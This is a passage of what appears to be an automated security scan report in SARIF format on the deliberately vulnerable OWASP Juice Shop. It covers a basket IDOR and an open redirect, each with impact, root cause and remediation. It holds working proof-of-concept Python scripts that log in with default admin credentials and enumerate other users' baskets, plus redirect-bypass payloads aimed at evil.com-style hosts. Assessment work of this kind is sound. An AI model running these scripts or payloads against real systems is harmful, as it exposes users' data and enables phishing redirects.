                  "endLine": 31,
                  "snippet": {
                    "text": "return async (req: Request, res: Response, next: NextFunction) => {\n    try {\n      const id = req.params.id\n      const basket = await BasketModel.findOne({ where: { id }, include: [{ model: ProductModel, paranoid: false, as: 'Products' }] })\n      /* jshint eqeqeq:false */\n      challengeUtils.solveIf(challenges.basketAccessChallenge, () => {\n        const user = security.authenticatedUsers.from(req)\n        return user && id && id !== 'undefined' && id !== 'null' && id !== 'NaN' && user.bid && user?.bid != parseInt(id, 10) // eslint-disable-line eqeqeq\n      })\n      if (((basket?.Products) != null) && basket.Products.length > 0) {\n        for (let i = 0; i < basket.Products.length; i++) {\n          basket.Products[i].name = req.__(basket.Products[i].name)\n        }\n      }\n\n      res.json(utils.queryResultToJson(basket))"
                  }
                }
              },
              "message": {
                "text": "Basket retrieval without ownership verification (IDOR sink)"
              }
            }
          ],
          "properties": {
            "security-severity": "6.5",
            "strix": {
              "id": "vuln-0007",
              "severity": "medium",
              "cvss": 6.5,
              "timestamp": "2026-05-09 09:47:03 UTC",
              "target": "https://github.com/juice-shop/juice-shop",
              "endpoint": "/rest/basket/:id",
              "method": "GET",
              "cwe": "CWE-639",
              "impact": "An attacker with a valid session can enumerate basket IDs (sequential integers starting at 1) and retrieve the shopping cart contents of all other users. This exposes:\n\n- Product selections and quantities (potential competitive intelligence or personal preference data)\n- User purchasing behavior and intent\n- Potential for chaining with basket manipulation to tamper with other users' orders\n\nIn a real-world e-commerce context, this constitutes a privacy violation and a regulatory compliance failure (GDPR, CCPA) as user behavioral data is disclosed without consent.",
              "technical_analysis": "The vulnerability exists in `routes/basket.ts` at lines 18-19. The handler extracts the basket ID directly from `req.params.id` and queries the database without any ownership check:\n\n```typescript\nconst id = req.params.id\nconst basket = await BasketModel.findOne({ where: { id }, include: [{ model: ProductModel, paranoid: false, as: 'Products' }] })\n```\n\nThe application does contain code that detects this access pattern (the `basketAccessChallenge` solver at lines 21-24), which confirms the vulnerability is intentional for the CTF context but represents a real authorization flaw. The code compares `user.bid` against the requested `id` to detect the exploit but never blocks unauthorized access.\n\nRoot cause: Missing server-side authorization enforcement. The endpoint should verify that the authenticated user's basket ID matches the requested basket ID before returning data.",
              "remediation_steps": "1. Add an authorization check in the `retrieveBasket` handler that compares the requested basket ID against the authenticated user's own basket ID. Return HTTP 403 if they do not match.\n\n2. Use the existing `security.authenticatedUsers.from(req)` helper to obtain the authenticated user's basket ID (`user.bid`) and compare it to the requested `req.params.id`.\n\n3. Consider removing the basket ID from the URL path entirely and instead always serving the authenticated user's own basket, eliminating the IDOR vector by design.\n\n4. Apply the same ownership check pattern to all basket-related endpoints (basket items, updates, deletions).",
              "poc": {
                "description": "To reproduce:\n\n1. Create two user accounts (User A and User B) and log in to each to obtain JWT tokens.\n2. Note User A's basket ID from the login response (the `bid` field).\n3. As User B, send a GET request to `/rest/basket/<User A's basket ID>` using User B's token.\n4. Observe that User B receives the full contents of User A's basket, including all products and quantities.\n5. Enumerate additional basket IDs (1, 2, 3, ...) to confirm all baskets are accessible.",
                "script": "import requests\n\nBASE_URL = \"http://localhost:3000\"\n\n# Step 1: Login as the admin (user ID 1, basket ID 1)\nlogin_a = requests.post(f\"{BASE_URL}/rest/user/login\", json={\n    \"email\": \"admin@juice-sh.op\",\n    \"password\": \"admin123\"\n})\ntoken_a = login_a.json().get(\"authentication\", {}).get(\"token\", \"\")\nbid_a = login_a.json().get(\"authentication\", {}).get(\"bid\", \"\")\nprint(f\"User A (admin) login: {login_a.status_code}, bid={bid_a}\")\n\n# Step 2: Register and login as a different user\nrequests.post(f\"{BASE_URL}/api/Users/\", json={\n    \"email\": \"idor_test@juice-sh.op\",\n    \"password\": \"TestPass123!\",\n    \"passwordRepeat\": \"TestPass123!\",\n    \"securityQuestion\": {\"id\": 1, \"question\": \"Test?\"},\n    \"securityAnswer\": \"test\"\n})\nlogin_b = requests.post(f\"{BASE_URL}/rest/user/login\", json={\n    \"email\": \"idor_test@juice-sh.op\",\n    \"password\": \"TestPass123!\"\n})\ntoken_b = login_b.json().get(\"authentication\", {}).get(\"token\", \"\")\nbid_b = login_b.json().get(\"authentication\", {}).get(\"bid\", \"\")\nprint(f\"User B login: {login_b.status_code}, bid={bid_b}\")\n\n# Step 3: As User B, access User A's basket\nidor_resp = requests.get(\n    f\"{BASE_URL}/rest/basket/{bid_a}\",\n    headers={\"Authorization\": f\"Bearer {token_b}\"}\n)\nprint(f\"\\nIDOR Test - User B accessing User A's basket (bid={bid_a}):\")\nprint(f\"Status: {idor_resp.status_code}\")\nprint(f\"Response: {idor_resp.text[:500]}\")\n\nif idor_resp.status_code == 200:\n    print(\"\\nCONFIRMED: IDOR - User B can access User A's basket without authorization\")\n\n# Step 4: Enumerate baskets\nprint(\"\\n--- Basket Enumeration ---\")\nfor basket_id in range(1, 6):\n    resp = requests.get(\n        f\"{BASE_URL}/rest/basket/{basket_id}\",\n        headers={\"Authorization\": f\"Bearer {token_b}\"}\n    )\n    data = resp.json().get(\"data\", {})\n    products = data.get(\"Products\", []) if data else []\n    print(f\"Basket {basket_id}: {resp.status_code} - {len(products)} products\")"
              }
            }
          }
        },
        {
          "ruleId": "CWE-601",
          "level": "warning",
          "message": {
            "text": "Open Redirect via Allowlist Bypass in URL Redirect Endpoint"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "lib/insecurity.ts"
                },
                "region": {
                  "startLine": 135,
                  "endLine": 141,
                  "snippet": {
                    "text": "export const isRedirectAllowed = (url: string) => {\n  let allowed = false\n  for (const allowedUrl of redirectAllowlist) {\n    allowed = allowed || url.includes(allowedUrl) // vuln-code-snippet vuln-line redirectChallenge\n  }\n  return allowed\n}"
                  }
                }
              },
              "message": {
                "text": "Flawed allowlist check using substring includes() instead of strict URL origin comparison"
              }
            }
          ],
          "properties": {
            "security-severity": "6.1",
            "strix": {
              "id": "vuln-0008",
              "severity": "medium",
              "cvss": 6.1,
              "timestamp": "2026-05-09 09:47:11 UTC",
              "target": "https://github.com/juice-shop/juice-shop",
              "endpoint": "/redirect",
              "method": "GET",
              "cwe": "CWE-601",
              "impact": "Successful exploitation enables an attacker to:\n\n- Construct phishing links that appear to originate from the trusted application domain, tricking users into visiting malicious sites after clicking what appears to be a legitimate link\n- Intercept OAuth authorization codes or tokens if the redirect endpoint is used in any authentication flow by redirecting to an attacker-controlled callback\n- Bypass content security policies or same-origin trust relationships where URL origin is used as a trust signal\n- Steal credentials by redirecting users to a cloned login page on an attacker-controlled domain\n\nThe vulnerability significantly increases the effectiveness of social engineering attacks because the initial link points to the legitimate application domain, which victims are more likely to trust.",
              "technical_analysis": "The vulnerability resides in the `isRedirectAllowed` function defined at line 135 of `lib/insecurity.ts`. The function iterates over a set of allowed URLs and checks whether the user-supplied URL contains any of them using `url.includes(allowedUrl)`.\n\nThe flawed logic:\n```javascript\nexport const isRedirectAllowed = (url: string) => {\n  let allowed = false\n  for (const allowedUrl of redirectAllowlist) {\n    allowed = allowed || url.includes(allowedUrl)\n  }\n  return allowed\n}\n```\n\nThe `includes()` method checks for substring presence anywhere in the string, not whether the URL starts with or matches the allowed domain. This creates multiple bypass vectors:\n\n1. Query parameter injection: `https://evil.com?x=https://github.com/juice-shop/juice-shop` — the allowed URL appears as a query parameter value\n2. Fragment injection: `https://evil.com#https://github.com/juice-shop/juice-shop` — the allowed URL appears in the fragment\n3. Path injection: `https://evil.com/https://github.com/juice-shop/juice-shop` — the allowed URL appears in the path\n4. Subdomain prepend: While less reliable for the full URL, partial matches or URL-encoding tricks may work depending on browser behavior\n\nThe `isUnintendedRedirect` function in `routes/redirect.ts` correctly uses `utils.startsWith()` for comparison, but this function is only used for challenge-solving logic and does not gate the actual redirect. The security check that gates the redirect relies solely on the flawed `isRedirectAllowed`.",
              "remediation_steps": "Replace the substring-based check with a strict URL origin comparison:\n\n1. Parse the user-supplied URL using the WHATWG URL constructor to canonicalize it and extract the origin (scheme + host + port).\n\n2. Compare the parsed origin against the set of allowed URL origins. Only permit the redirect if the origin matches exactly.\n\n3. Alternatively, verify that the user-supplied URL starts with one of the allowed URLs using strict prefix comparison (as the existing `isUnintendedRedirect` function already demonstrates with `startsWith`).\n\n4. Reject URLs that cannot be parsed or that use unexpected schemes (e.g., `javascript:`, `data:`, `vbscript:`).\n\n5. Consider removing the open redirector entirely if it is not a business requirement, or restrict it to relative same-origin paths only.",
              "poc": {
                "description": "To reproduce the open redirect:\n\n1. Construct a URL that embeds one of the allowlisted URLs as a query parameter:\n   \n   GET /redirect?to=https://evil.com?https://github.com/juice-shop/juice-shop\n\n2. Send the request to the application. The server evaluates `isRedirectAllowed(\"https://evil.com?https://github.com/juice-shop/juice-shop\")`.\n\n3. The function finds that the input string includes `https://github.com/juice-shop/juice-shop` and returns `true`.\n\n4. The server responds with HTTP 302 and `Location: https://evil.com?https://github.com/juice-shop/juice-shop`, redirecting the victim's browser to the attacker-controlled domain.\n\n5. Alternative bypass payloads:\n   - `https://evil.com#https://github.com/juice-shop/juice-shop`\n   - `https://evil.com/path?ref=http://leanpub.com/juice-shop`",
                "script": "import requests\n\nBASE_URL = \"http://localhost:3000\"\n\n# Allowed URLs from the allowlist in lib/insecurity.ts\nALLOWED_URLS = [\n    \"https://github.com/juice-shop/juice-shop\",\n    \"http://shop.spreadshirt.com/juiceshop\",\n    \"http://leanpub.com/juice-shop\",\n]\n\n# Bypass payloads embedding allowed URLs as substrings\nBYPASS_PAYLOADS = [\n    # Query parameter bypass\n    \"https://evil.com?x=https://github.com/juice-shop/juice-shop\",\n    # Fragment bypass\n    \"https://evil.com#https://github.com/juice-shop/juice-shop\",\n    # Path segment bypass\n    \"https://evil.com/https://github.com/juice-shop/juice-shop\",\n    # Different allowed URL in query\n    \"https://evil.com?ref=http://leanpub.com/juice-shop\",\n    # Subdomain-style with allowed URL as query\n    \"https://attacker.example.org/phish?http://shop.spreadshirt.com/juiceshop\",\n]\n\nprint(\"[*] Testing Open Redirect bypass via includes() allowlist check\")\nprint(f\"[*] Target: {BASE_URL}/redirect\")\nprint()\n\nfor payload in BYPASS_PAYLOADS:\n    resp = requests.get(\n        f\"{BASE_URL}/redirect\",\n        params={\"to\": payload},\n        allow_redirects=False,\n        timeout=10\n    )\n    status = resp.status_code\n    location = resp.headers.get(\"Location\", \"N/A\")\n    \n    if status == 302 and \"evil.com\" in location or \"attacker.example\" in location:\n        result = \"VULNERABLE - Redirect to attacker domain\"\n    elif status == 302:\n        result = f\"Redirect to: {location}\"\n    elif status == 406:\n        result = \"BLOCKED (406)\"\n    else:\n        result = f\"Unexpected status: {status}\"\n    \n    print(f\"  Payload: {payload}\")\n    print(f\"  Result:  [{status}] {result}\")\n    print()\n\nprint(\"[*] Testing legitimate allowed URL (should redirect normally)\")\nlegit_resp = requests.get(\n    f\"{BASE_URL}/redirect\",\n    params={\"to\": \"https://github.com/juice-shop/juice-shop\"},\n    allow_redirects=False,\n    timeout=10\n)\nprint(f\"  Legit URL status: {legit_resp.status_code}\")\nprint(f\"  Location: {legit_resp.headers.get('Location', 'N/A')}\")"
              }
            }
          }
        },
        {
          "ruleId": "CWE-916",
          "level": "warning",
          "message": {
            "text": "Insecure Password Storage Using Unsalted MD5 Hashing"
          },
          "locations": [
